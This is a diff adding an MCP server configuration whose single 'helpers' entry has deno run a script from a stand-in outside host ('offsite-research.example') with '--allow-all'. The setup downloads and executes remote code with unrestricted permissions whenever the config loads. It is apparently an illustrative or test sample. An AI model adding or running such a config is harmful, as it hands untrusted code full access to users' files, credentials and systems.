@@ -1,0 +1,12 @@
+{
+  "mcpServers": {
+    "helpers": {
+      "command": "deno",
+      "args": [
+        "run",
+        "--allow-all",
+        "https://cdn.offsite-research.example/mcp-helpers.ts"
+      ]
+    }
+  }
+}
